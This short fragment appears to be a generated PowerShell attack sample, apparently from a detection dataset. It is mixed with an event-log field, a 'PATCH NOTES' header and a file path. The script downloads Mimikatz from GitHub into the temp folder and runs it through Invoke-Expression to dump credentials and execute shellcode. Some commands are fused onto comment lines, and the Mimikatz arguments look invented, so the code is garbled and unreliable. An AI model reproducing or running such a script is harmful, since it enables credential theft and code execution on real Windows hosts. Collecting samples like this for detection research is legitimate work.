EventData.Data: DefaultAppDomain

## PATCH NOTES: iter 1
# Download Mimikatz binary Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210725/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
Expand-Archive -Path "$env:TEMP\mimikatz.zip" -DestinationPath "$env:TEMP\mimikatz"
# Define parameters $dumpCredsParams = "/inject /injected /format:hashes /dumpcreds" $shellcodeParams = "/inject /injected /shellcode:`"C0DE`""
# Execute Mimikatz for credential dumping Invoke-Expression "$env:TEMP\mimikatz\x64\mimikatz.exe $dumpCredsParams"
# Execute Mimikatz for shellcode execution Invoke-Expression "$env:TEMP\mimikatz\x64\mimikatz.exe $shellcodeParams"
C:\ProgramData\psandman\inputs\example_192_generated_openai.ps1
